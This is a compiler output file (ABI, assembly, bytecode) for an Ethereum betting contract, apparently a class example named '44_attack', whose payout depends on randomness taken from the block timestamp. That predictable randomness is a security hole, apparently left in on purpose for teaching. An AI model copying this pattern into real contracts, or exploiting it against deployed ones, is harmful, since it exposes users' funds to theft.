{
	"44_attack.sol": {
		"class44_game": {
			"abi": [
				{
					"constant": true,
					"inputs": [],
					"name": "kk",
					"outputs": [
						{
							"name": "",
							"type": "int256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "play",
					"outputs": [],
					"payable": true,
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "get_random",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"payable": true,
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"payable": true,
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"name": "",
							"type": "address"
						}
					],
					"name": "win",
					"type": "event"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"44_attack.sol\":26:641  contract class44_game{... */\n  mstore(0x40, 0x80)\n    /* \"44_attack.sol\":93:94  1 */\n  0x1\n    /* \"44_attack.sol\":78:94  int public kk =1 */\n  0x0\n  sstore\n    /* \"44_attack.sol\":619:626  1 ether */\n  0xde0b6b3a7640000\n    /* \"44_attack.sol\":606:615  msg.value */\n  callvalue\n    /* \"44_attack.sol\":606:626  msg.value >= 1 ether */\n  lt\n  iszero\n    /* \"44_attack.sol\":598:627  require(msg.value >= 1 ether) */\n  iszero\n  iszero\n  tag_3\n  jumpi\n  0x0\n  dup1\n  revert\ntag_3:\n    /* \"44_attack.sol\":26:641  contract class44_game{... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"44_attack.sol\":26:641  contract class44_game{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x3779c39e\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x93e84cd9\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x98107e5b\n      eq\n      tag_4\n      jumpi\n    tag_1:\n        /* \"44_attack.sol\":534:541  1 ether */\n      0xde0b6b3a7640000\n        /* \"44_attack.sol\":521:530  msg.value */\n      callvalue\n        /* \"44_attack.sol\":521:541  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"44_attack.sol\":513:542  require(msg.value >= 1 ether) */\n      iszero\n      iszero\n      tag_7\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_7:\n        /* \"44_attack.sol\":26:641  contract class44_game{... */\n      stop\n        /* \"44_attack.sol\":78:94  int public kk =1 */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_8:\n        /* \"44_attack.sol\":78:94  int public kk =1 */\n      pop\n      tag_9\n      jump(tag_10)\n    tag_9:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":256:471  function play() public payable {... */\n    tag_3:\n      tag_11\n      jump(tag_12)\n    tag_11:\n      stop\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_13:\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n      pop\n      tag_14\n      jump(tag_15)\n    tag_14:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":78:94  int public kk =1 */\n    tag_10:\n      sload(0x0)\n      dup2\n      jump\t// out\n        /* \"44_attack.sol\":256:471  function play() public payable {... */\n    tag_12:\n        /* \"44_attack.sol\":318:328  0.01 ether */\n      0x2386f26fc10000\n        /* \"44_attack.sol\":305:314  msg.value */\n      callvalue\n        /* \"44_attack.sol\":305:328  msg.value == 0.01 ether */\n      eq\n        /* \"44_attack.sol\":297:329  require(msg.value == 0.01 ether) */\n      iszero\n      iszero\n      tag_17\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_17:\n        /* \"44_attack.sol\":343:344  1 */\n      0x1\n        /* \"44_attack.sol\":339:341  kk */\n      0x0\n      dup1\n        /* \"44_attack.sol\":339:344  kk+=1 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"44_attack.sol\":371:374  500 */\n      0x1f4\n        /* \"44_attack.sol\":357:369  get_random() */\n      tag_18\n        /* \"44_attack.sol\":357:367  get_random */\n      tag_15\n        /* \"44_attack.sol\":357:369  get_random() */\n      jump\t// in\n    tag_18:\n        /* \"44_attack.sol\":357:374  get_random()>=500 */\n      lt\n      iszero\n        /* \"44_attack.sol\":354:465  if(get_random()>=500){... */\n      iszero\n      tag_19\n      jumpi\n        /* \"44_attack.sol\":389:399  msg.sender */\n      caller\n        /* \"44_attack.sol\":389:408  msg.sender.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"44_attack.sol\":389:420  msg.sender.transfer(0.02 ether) */\n      0x8fc\n        /* \"44_attack.sol\":409:419  0.02 ether */\n      0x470de4df820000\n        /* \"44_attack.sol\":389:420  msg.sender.transfer(0.02 ether) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_20\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_20:\n        /* \"44_attack.sol\":389:420  msg.sender.transfer(0.02 ether) */\n      pop\n        /* \"44_attack.sol\":439:454  win(msg.sender) */\n      0xa34cc845dfe7e94da90b41e77f799f7c29c20a39271c97a2469ce08afed0830b\n        /* \"44_attack.sol\":443:453  msg.sender */\n      caller\n        /* \"44_attack.sol\":439:454  win(msg.sender) */\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"44_attack.sol\":354:465  if(get_random()>=500){... */\n    tag_19:\n        /* \"44_attack.sol\":256:471  function play() public payable {... */\n      jump\t// out\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n    tag_15:\n        /* \"44_attack.sol\":143:147  uint */\n      0x0\n        /* \"44_attack.sol\":158:172  bytes32 ramdon */\n      dup1\n        /* \"44_attack.sol\":202:205  now */\n      timestamp\n        /* \"44_attack.sol\":185:206  abi.encodePacked(now) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"44_attack.sol\":185:206  abi.encodePacked(now) */\n      swap1\n      0x40\n      mstore\n        /* \"44_attack.sol\":175:207  keccak256(abi.encodePacked(now)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_22:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":51:70   */\n      iszero\n        /* \"--CODEGEN--\":36:189   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_22)\n    tag_23:\n        /* \"--CODEGEN--\":274:275   */\n      0x1\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"44_attack.sol\":175:207  keccak256(abi.encodePacked(now)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"44_attack.sol\":158:207  bytes32 ramdon = keccak256(abi.encodePacked(now)) */\n      swap1\n      pop\n        /* \"44_attack.sol\":239:243  1000 */\n      0x3e8\n        /* \"44_attack.sol\":229:235  ramdon */\n      dup2\n        /* \"44_attack.sol\":224:236  uint(ramdon) */\n      0x1\n      swap1\n      div\n        /* \"44_attack.sol\":224:243  uint(ramdon) % 1000 */\n      dup2\n      iszero\n      iszero\n      tag_25\n      jumpi\n      invalid\n    tag_25:\n      mod\n        /* \"44_attack.sol\":217:243  return uint(ramdon) % 1000 */\n      swap2\n      pop\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n      pop\n      swap1\n      jump\t// out\n\n    auxdata: 0xa165627a7a723058205c80badcd0d42c9be5f3b8553f07e538d2093bd54a880abc980ed9b58f135fb30029\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040526001600055670de0b6b3a7640000341015151561002057600080fd5b61028c8061002f6000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633779c39e1461007057806393e84cd91461009b57806398107e5b146100a5575b670de0b6b3a7640000341015151561006e57600080fd5b005b34801561007c57600080fd5b506100856100d0565b6040518082815260200191505060405180910390f35b6100a36100d6565b005b3480156100b157600080fd5b506100ba6101c1565b6040518082815260200191505060405180910390f35b60005481565b662386f26fc10000341415156100eb57600080fd5b600160008082825401925050819055506101f46101066101c1565b1015156101bf573373ffffffffffffffffffffffffffffffffffffffff166108fc66470de4df8200009081150290604051600060405180830381858888f1935050505015801561015a573d6000803e3d6000fd5b507fa34cc845dfe7e94da90b41e77f799f7c29c20a39271c97a2469ce08afed0830b33604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a15b565b60008042604051602001808281526020019150506040516020818303038152906040526040518082805190602001908083835b60208310151561021957805182526020820191506020810190506020830392506101f4565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902090506103e8816001900481151561025957fe5b06915050905600a165627a7a723058205c80badcd0d42c9be5f3b8553f07e538d2093bd54a880abc980ed9b58f135fb30029",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x1 PUSH1 0x0 SSTORE PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO ISZERO ISZERO PUSH2 0x20 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x28C DUP1 PUSH2 0x2F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x3779C39E EQ PUSH2 0x70 JUMPI DUP1 PUSH4 0x93E84CD9 EQ PUSH2 0x9B JUMPI DUP1 PUSH4 0x98107E5B EQ PUSH2 0xA5 JUMPI JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO ISZERO ISZERO PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x85 PUSH2 0xD0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA3 PUSH2 0xD6 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xBA PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH7 0x2386F26FC10000 CALLVALUE EQ ISZERO ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP1 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0x1F4 PUSH2 0x106 PUSH2 0x1C1 JUMP JUMPDEST LT ISZERO ISZERO PUSH2 0x1BF JUMPI CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH7 0x470DE4DF820000 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x15A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH32 0xA34CC845DFE7E94DA90B41E77F799F7C29C20A39271C97A2469CE08AFED0830B CALLER PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT ISZERO ISZERO PUSH2 0x219 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1F4 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP PUSH2 0x3E8 DUP2 PUSH1 0x1 SWAP1 DIV DUP2 ISZERO ISZERO PUSH2 0x259 JUMPI INVALID JUMPDEST MOD SWAP2 POP POP SWAP1 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0x5c DUP1 0xba 0xdc 0xd0 0xd4 0x2c SWAP12 0xe5 RETURN 0xb8 SSTORE 0x3f SMOD 0xe5 CODESIZE 0xd2 MULMOD EXTCODESIZE 0xd5 0x4a DUP9 EXP 0xbc SWAP9 0xe 0xd9 0xb5 DUP16 SGT 0x5f 0xb3 STOP 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "130400",
						"executionCost": "20190",
						"totalCost": "150590"
					},
					"external": {
						"": "165",
						"get_random()": "infinite",
						"kk()": "394",
						"play()": "infinite"
					}
				},
				"methodIdentifiers": {
					"get_random()": "98107e5b",
					"kk()": "3779c39e",
					"play()": "93e84cd9"
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}